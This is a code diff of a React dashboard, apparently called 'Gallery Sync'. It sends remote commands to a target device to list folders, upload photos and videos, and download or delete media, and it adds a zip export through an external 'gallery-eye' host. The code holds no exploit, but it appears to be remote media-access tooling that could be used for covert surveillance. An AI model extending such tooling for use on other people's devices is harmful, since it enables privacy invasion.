@@ -125,7 +125,6 @@ export default function Home() {
 
     const [previewItem, setPreviewItem] = useState<any>(null);
     const [isSelectionMode, setIsSelectionMode] = useState(false);
-    const [customFolderPath, setCustomFolderPath] = useState('');
     const [isDownloading, setIsDownloading] = useState(false);
     const [isDeleting, setIsDeleting] = useState(false);
     const [isScrolled, setIsScrolled] = useState(false);
@@ -1224,11 +1223,14 @@ export default function Home() {
             newSelection.add(id);
         }
         setSelectedItems(newSelection);
+        if (newSelection.size === 0) setIsSelectionMode(false);
+        else setIsSelectionMode(true);
     };
 
     const selectAll = () => {
         if (selectedItems.size === filteredImages.length) {
             setSelectedItems(new Set());
+            setIsSelectionMode(false);
         } else {
             setSelectedItems(new Set(filteredImages.map(img => img.id)));
             setIsSelectionMode(true);
@@ -1418,70 +1420,31 @@ END:VCARD`;
             case 'gallery':
                 return (
                     <div className="space-y-6 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
-                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4 bg-white/5 p-6 rounded-3xl border border-white/10 shadow-neo-xl">
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4 neo-surface p-6">
                             <div className="flex items-center gap-4">
                                 <div className="w-14 h-14 rounded-2xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20 shadow-[0_0_20px_rgba(16,185,129,0.15)]">
                                     <ImageIcon size={28} className="text-emerald-400" />
                                 </div>
                                 <div>
                                     <h2 className="text-2xl font-bold tracking-tight">Gallery Sync</h2>
-                                    <p className="text-sm text-white/40">Browse and manage device media</p>
+                                    <p className="text-sm text-white/40 font-data tracking-wide">Browse and manage device media</p>
                                 </div>
                             </div>
                             <div className="flex flex-wrap items-center gap-3">
-                                <div className="flex items-center gap-2 bg-black/40 border border-white/10 rounded-xl px-3 py-1 shadow-inner h-10">
-                                    <Folder size={14} className="text-white/40" />
-                                    <input 
-                                        type="text" 
-                                        value={customFolderPath} 
-                                        onChange={(e) => setCustomFolderPath(e.target.value)}
-                                        placeholder="Custom path..."
-                                        className="bg-transparent border-none outline-none text-xs text-white placeholder:text-white/30 w-24 sm:w-32 focus:ring-0"
-                                    />
-                                    <button 
-                                        onClick={() => {
-                                            if (customFolderPath && selectedDeviceId && socket && session?.user?.uuid) {
-                                                socket.emit('command', {
-                                                    uuid: session.user.uuid,
-                                                    targetDeviceId: selectedDeviceId,
-                                                    action: 'fetch_folder',
-                                                    path: customFolderPath
-                                                });
-                                                setCustomFolderPath('');
-                                                setShowCustomAlert(true);
-                                                setAlertData({ title: 'Request Sent', message: `Requested device to fetch folder: ${customFolderPath}`, type: 'success' });
-                                            }
-                                        }}
-                                        disabled={!customFolderPath || !selectedDeviceId}
-                                        className="text-emerald-400 hover:text-emerald-300 p-1 disabled:opacity-50 transition-colors"
-                                    >
-                                        <RefreshCw size={14} />
-                                    </button>
-                                </div>
-                                <button onClick={fetchFolders} disabled={!selectedDeviceId} className="btn-primary py-2 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)] h-10">
-                                    <RefreshCw size={16} /> Refresh
-                                </button>
-                                {folders.length > 0 && (
+                                {selectedFolder && (
                                     <button 
                                         onClick={() => {
                                             setIsSelectionMode(!isSelectionMode);
                                             setSelectedItems(new Set());
                                         }}
-                                        className={`text-sm font-bold px-4 rounded-xl border transition-all h-10 ${isSelectionMode ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/50 shadow-[0_0_15px_rgba(16,185,129,0.2)]' : 'bg-white/5 text-white/70 border-white/10 hover:bg-white/10 hover:text-white'}`}
+                                        className={`flex items-center gap-2 py-2.5 px-5 rounded-xl font-bold transition-all text-sm border ${isSelectionMode ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/50 shadow-[0_0_15px_rgba(16,185,129,0.2)]' : 'bg-white/5 text-white/70 border-white/10 hover:bg-white/10 hover:text-white'}`}
                                     >
-                                        {isSelectionMode ? 'Cancel' : 'Select'}
+                                        <CheckSquare size={16} /> {isSelectionMode ? 'Cancel Selection' : 'Select Mode'}
                                     </button>
                                 )}
-                                {isSelectionMode && selectedItems.size > 0 && (
-                                    <>
-                                        <button onClick={downloadSelected} disabled={isDownloading} className="btn-secondary py-2 px-4 rounded-xl h-10">
-                                            <Download size={16} /> {isDownloading ? 'Downloading...' : (selectedItems.size > 1 ? 'Download Zip' : 'Download')}
-                                        </button>
-                                        <button onClick={() => setDeleteConfirmation({ isOpen: true, ids: Array.from(selectedItems) })} disabled={isDeleting} className="btn-secondary py-2 px-4 rounded-xl text-red-400 border-red-400/20 hover:bg-red-400/10 hover:border-red-400/50 h-10">
-                                            <Trash2 size={16} /> {isDeleting ? 'Deleting...' : 'Delete'}
-                                        </button>
-                                    </>
-                                )}
+                                <button onClick={fetchFolders} disabled={!selectedDeviceId} className="flex items-center gap-2 py-2.5 px-5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)] font-bold transition-all text-sm">
+                                    <RefreshCw size={16} /> Fetch Folders
+                                </button>
                             </div>
                         </div>
 
@@ -1490,16 +1453,14 @@ END:VCARD`;
                                 {folders.map((folder: any, i: number) => (
                                     <motion.button 
                                         key={i}
-                                        whileHover={{ scale: 1.02 }}
-                                        whileTap={{ scale: 0.98 }}
                                         onClick={() => handleFolderClick(folder)}
-                                        className="p-6 rounded-3xl bg-white/5 border border-white/10 flex flex-col gap-4 text-left transition-all hover:border-emerald-500/50 hover:bg-white/10 hover:shadow-neo-lg group"
+                                        className="p-6 rounded-[2rem] neo-button flex flex-col gap-4 text-left transition-all hover:border-emerald-500/50 hover:shadow-[0_0_20px_rgba(16,185,129,0.15)] group border border-transparent"
                                     >
                                         <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500/20 to-emerald-900/40 flex items-center justify-center border border-emerald-500/20 shadow-inner group-hover:scale-110 transition-transform">
                                             <Folder className="text-emerald-400 w-7 h-7" />
                                         </div>
                                         <div>
-                                            <h3 className="font-bold truncate text-white/90 text-lg">{folder.name}</h3>
+                                            <h3 className="font-bold truncate text-white/90 text-lg group-hover:text-emerald-400 transition-colors">{folder.name}</h3>
                                             <p className="text-xs text-emerald-400/70 mt-1 font-data uppercase tracking-widest">{folder.count || 0} items</p>
                                         </div>
                                     </motion.button>
@@ -1508,38 +1469,79 @@ END:VCARD`;
                         )}
 
                         {selectedFolder && (
-                            <div className="p-6 md:p-8 rounded-[2rem] bg-black/40 border border-white/5 mb-6 relative overflow-hidden shadow-inner">
-                                <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 blur-[80px] pointer-events-none rounded-full" />
+                            <div className="p-6 md:p-8 rounded-[2rem] neo-surface mb-6 relative overflow-hidden">
+                                <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/5 blur-[80px] pointer-events-none rounded-full" />
                                 <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-4">
                                     <div className="flex items-center gap-4">
-                                        <button onClick={() => setSelectedFolder(null)} className="w-12 h-12 flex items-center justify-center rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 transition-colors">
-                                            <ChevronDown size={24} className="rotate-90 text-white/60" />
+                                        <button onClick={() => setSelectedFolder(null)} className="w-12 h-12 flex items-center justify-center rounded-2xl bg-black/40 border border-white/5 hover:bg-white/5 transition-colors shadow-inner">
+                                            <ChevronDown size={24} className="rotate-90 text-emerald-400" />
                                         </button>
                                         <div>
                                             <h3 className="text-2xl font-bold tracking-tight text-white">{selectedFolder.name}</h3>
                                             <p className="text-xs text-emerald-400 font-data uppercase tracking-widest mt-1">{selectedFolder.count} items available</p>
                                         </div>
                                     </div>
-                                    {syncMediaType && (
-                                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-wrap gap-2 w-full md:w-auto bg-white/5 p-1.5 rounded-2xl border border-white/10">
-                                            <button onClick={() => triggerUpload(5)} className="btn-secondary text-xs py-2 px-4 rounded-xl border-none hover:bg-white/10">Sync 5</button>
-                                            <button onClick={() => triggerUpload(20)} className="btn-secondary text-xs py-2 px-4 rounded-xl border-none hover:bg-white/10">Sync 20</button>
-                                            <button onClick={() => triggerUpload(50)} className="btn-secondary text-xs py-2 px-4 rounded-xl border-none hover:bg-white/10">Sync 50</button>
-                                            <button onClick={() => {
-                                                setSyncOptionsFolder({ name: selectedFolder.name, count: selectedFolder.count, type: syncMediaType });
-                                                setShowSyncOptionsModal(true);
-                                            }} className="btn-primary text-xs py-2 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 border-none shadow-[0_0_15px_rgba(16,185,129,0.3)]">Sync All</button>
-                                        </motion.div>
-                                    )}
+                                    <div className="flex flex-wrap items-center gap-3 w-full md:w-auto">
+                                        {/* Download Folder as Zip */}
+                                        <button 
+                                            onClick={() => {
+                                                const urls = filteredImages.map((i: any) => i.url);
+                                                if(urls.length === 0) return;
+                                                fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-zip', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ urls }) })
+                                                .then(res => res.blob()).then(blob => {
+                                                    const url = window.URL.createObjectURL(blob);
+                                                    const a = document.createElement('a'); a.href = url; a.download = `${selectedFolder.name}_backup.zip`; document.body.appendChild(a); a.click();
+                                                    window.URL.revokeObjectURL(url); document.body.removeChild(a);
+                                                });
+                                            }}
+                                            className="flex items-center justify-center gap-2 py-2.5 px-5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white font-bold transition-all text-sm shadow-inner"
+                                        >
+                                            <Package size={16} className="text-emerald-400" /> Download Folder Zip
+                                        </button>
+
+                                        {syncMediaType && (
+                                            <div className="flex bg-black/40 p-1.5 rounded-2xl border border-white/5 shadow-inner">
+                                                <button onClick={() => triggerUpload(5)} className="py-2 px-4 rounded-xl text-xs font-bold text-white/50 hover:text-white hover:bg-white/5 transition-colors">Sync 5</button>
+                                                <button onClick={() => triggerUpload(20)} className="py-2 px-4 rounded-xl text-xs font-bold text-white/50 hover:text-white hover:bg-white/5 transition-colors">Sync 20</button>
+                                                <button onClick={() => triggerUpload(50)} className="py-2 px-4 rounded-xl text-xs font-bold text-white/50 hover:text-white hover:bg-white/5 transition-colors">Sync 50</button>
+                                                <button onClick={() => {
+                                                    setSyncOptionsFolder({ name: selectedFolder.name, count: selectedFolder.count, type: syncMediaType });
+                                                    setShowSyncOptionsModal(true);
+                                                }} className="py-2 px-4 rounded-xl text-xs font-bold bg-emerald-500 text-black shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all">Sync All</button>
+                                            </div>
+                                        )}
+                                    </div>
                                 </div>
                                 <div className="flex items-center gap-4 relative z-10">
-                                    <button onClick={() => setSyncMediaType('image')} className={`flex-1 p-6 rounded-2xl border transition-all duration-300 group ${syncMediaType === 'image' ? 'bg-emerald-500/10 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-black/50 border-white/5 hover:border-white/10 hover:bg-white/5'}`}>
-                                        <ImageIcon size={32} className={`mx-auto mb-3 transition-colors ${syncMediaType === 'image' ? 'text-emerald-400' : 'text-white/30 group-hover:text-white/60'}`} />
-                                        <div className={`text-center font-bold tracking-wide ${syncMediaType === 'image' ? 'text-emerald-400' : 'text-white/50 group-hover:text-white/80'}`}>Photos</div>
+                                    <button onClick={() => setSyncMediaType('image')} className={`flex-1 py-4 px-6 rounded-2xl border transition-all duration-300 group flex items-center justify-center gap-3 ${syncMediaType === 'image' ? 'bg-emerald-500/10 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-black/40 border-white/5 hover:border-white/10 hover:bg-white/5 shadow-inner'}`}>
+                                        <ImageIcon size={24} className={`transition-colors ${syncMediaType === 'image' ? 'text-emerald-400' : 'text-white/30 group-hover:text-white/60'}`} />
+                                        <span className={`font-bold tracking-wide ${syncMediaType === 'image' ? 'text-emerald-400' : 'text-white/50 group-hover:text-white/80'}`}>Photos</span>
                                     </button>
-                                    <button onClick={() => setSyncMediaType('video')} className={`flex-1 p-6 rounded-2xl border transition-all duration-300 group ${syncMediaType === 'video' ? 'bg-emerald-500/10 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-black/50 border-white/5 hover:border-white/10 hover:bg-white/5'}`}>
-                                        <Video size={32} className={`mx-auto mb-3 transition-colors ${syncMediaType === 'video' ? 'text-emerald-400' : 'text-white/30 group-hover:text-white/60'}`} />
-                                        <div className={`text-center font-bold tracking-wide ${syncMediaType === 'video' ? 'text-emerald-400' : 'text-white/50 group-hover:text-white/80'}`}>Videos</div>
+                                    <button onClick={() => setSyncMediaType('video')} className={`flex-1 py-4 px-6 rounded-2xl border transition-all duration-300 group flex items-center justify-center gap-3 ${syncMediaType === 'video' ? 'bg-emerald-500/10 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-black/40 border-white/5 hover:border-white/10 hover:bg-white/5 shadow-inner'}`}>
+                                        <Video size={24} className={`transition-colors ${syncMediaType === 'video' ? 'text-emerald-400' : 'text-white/30 group-hover:text-white/60'}`} />
+                                        <span className={`font-bold tracking-wide ${syncMediaType === 'video' ? 'text-emerald-400' : 'text-white/50 group-hover:text-white/80'}`}>Videos</span>
+                                    </button>
+                                </div>
+                            </div>
+                        )}
+
+                        {isSelectionMode && selectedItems.size > 0 && (
+                            <div className="flex items-center justify-between bg-emerald-500/10 border border-emerald-500/30 rounded-[2rem] p-4 mb-4 shadow-[0_0_20px_rgba(16,185,129,0.15)] animate-in fade-in slide-in-from-top-2">
+                                <span className="text-sm font-bold text-emerald-400 pl-2">{selectedItems.size} items selected</span>
+                                <div className="flex items-center gap-3">
+                                    <button 
+                                        onClick={downloadSelected}
+                                        disabled={isDownloading}
+                                        className="flex items-center gap-2 px-4 py-2 rounded-xl bg-emerald-500 text-black font-bold transition-all shadow-[0_0_15px_rgba(16,185,129,0.3)] hover:bg-emerald-400"
+                                    >
+                                        <Download size={16} /> {isDownloading ? 'Downloading...' : 'Download'}
+                                    </button>
+                                    <button 
+                                        onClick={deleteSelected}
+                                        disabled={isDeleting}
+                                        className="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-500/20 hover:bg-red-500/40 border border-red-500/30 text-red-400 font-bold transition-colors"
+                                    >
+                                        <Trash2 size={16} /> {isDeleting ? 'Deleting...' : 'Delete'}
                                     </button>
                                 </div>
                             </div>
@@ -1551,41 +1553,38 @@ END:VCARD`;
                                     {tab.charAt(0).toUpperCase() + tab.slice(1)}s
                                 </button>
                             ))}
-                            <button onClick={selectAll} className="ml-auto flex items-center gap-2 px-4 py-2 rounded-xl text-sm bg-white/5 border border-white/5 hover:border-white/10 hover:bg-white/10 transition-all font-bold">
-                                <CheckSquare size={16} className="text-emerald-400" /> Select All
-                            </button>
+                            {isSelectionMode && (
+                                <button onClick={selectAll} className="ml-auto flex items-center gap-2 px-4 py-2 rounded-xl text-sm bg-emerald-500/10 border border-emerald-500/30 hover:bg-emerald-500/20 text-emerald-400 transition-all font-bold shadow-inner">
+                                    <CheckSquare size={16} /> Select All
+                                </button>
+                            )}
                         </div>
                         
                         <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-4 px-2 pb-6">
                             {filteredImages.map((img: any) => (
-                                <div key={img.id} onClick={() => isSelectionMode ? toggleSelection(img.id) : setPreviewItem(img)} className={`relative flex flex-col bg-black/40 border transition-all duration-300 rounded-xl overflow-hidden cursor-pointer group ${isSelectionMode && selectedItems.has(img.id) ? 'border-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.3)] scale-95' : 'border-white/5 hover:border-emerald-500/50 hover:shadow-[0_0_15px_rgba(16,185,129,0.15)] hover:scale-[1.02]'}`}>
-                                    <div className="relative aspect-square">
-                                        {img.resource_type === 'video' ? (
-                                            <video src={img.url} className="w-full h-full object-cover pointer-events-none" />
-                                        ) : (
-                                            <img src={img.url} alt="Gallery" className="w-full h-full object-cover pointer-events-none" loading="lazy" />
-                                        )}
-                                        {isSelectionMode && (
-                                            <div className="absolute top-2 right-2">
-                                                <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-colors ${selectedItems.has(img.id) ? 'bg-emerald-500 border-emerald-500' : 'bg-black/40 border-white/40'}`}>
-                                                    {selectedItems.has(img.id) && <CheckSquare size={12} className="text-black" />}
-                                                </div>
+                                <div 
+                                    key={img.id} 
+                                    onClick={() => {
+                                        if (isSelectionMode) toggleSelection(img.id);
+                                        else setPreviewItem(img);
+                                    }} 
+                                    className={`relative aspect-square rounded-[2rem] overflow-hidden cursor-pointer group transition-all duration-300 border ${selectedItems.has(img.id) ? 'scale-[0.92] border-emerald-500 shadow-[0_0_20px_rgba(16,185,129,0.3)] ring-2 ring-emerald-500 ring-offset-2 ring-offset-black' : 'border-white/5 hover:border-emerald-500/50 hover:shadow-neo-lg'}`}
+                                >
+                                    {img.resource_type === 'video' ? (
+                                        <video src={img.url} className="w-full h-full object-cover pointer-events-none" />
+                                    ) : (
+                                        <img src={img.url} alt="Gallery" className="w-full h-full object-cover pointer-events-none" loading="lazy" />
+                                    )}
+                                    {isSelectionMode && (
+                                        <div className="absolute top-3 right-3">
+                                            <div className={`w-7 h-7 rounded-full border-2 flex items-center justify-center transition-colors ${selectedItems.has(img.id) ? 'bg-emerald-500 border-emerald-500' : 'bg-black/60 border-white/40'}`}>
+                                                {selectedItems.has(img.id) && <Check size={14} className="text-black font-bold" strokeWidth={3} />}
                                             </div>
-                                        )}
-                                        {img.resource_type === 'video' && (
-                                            <div className="absolute top-1 left-1 bg-black/60 rounded px-1 py-0.5 pointer-events-none">
-                                                <Video size={10} className="text-white" />
-                                            </div>
-                                        )}
-                                    </div>
-                                    {!isSelectionMode && (
-                                        <div className="flex w-full p-1.5 gap-1.5 bg-black/60 border-t border-white/5 mt-auto">
-                                            <button onClick={(e) => { e.stopPropagation(); setPreviewItem(img); }} className="flex-1 py-2 flex justify-center items-center bg-white/5 hover:bg-white/20 text-white/70 hover:text-white rounded-lg transition-colors">
-                                                <Search size={14} />
-                                            </button>
-                                            <button onClick={(e) => { e.stopPropagation(); setDeleteConfirmation({ isOpen: true, ids: [img.id] }); }} className="flex-1 py-2 flex justify-center items-center bg-red-500/10 hover:bg-red-500/30 text-red-400 hover:text-red-300 rounded-lg transition-colors">
-                                                <Trash2 size={14} />
-                                            </button>
+                                        </div>
+                                    )}
+                                    {img.resource_type === 'video' && (
+                                        <div className="absolute top-3 left-3 bg-black/60 backdrop-blur-md rounded-lg px-2 py-1 flex items-center gap-1 border border-white/10 pointer-events-none">
+                                            <Video size={12} className="text-emerald-400" />
                                         </div>
                                     )}
                                 </div>
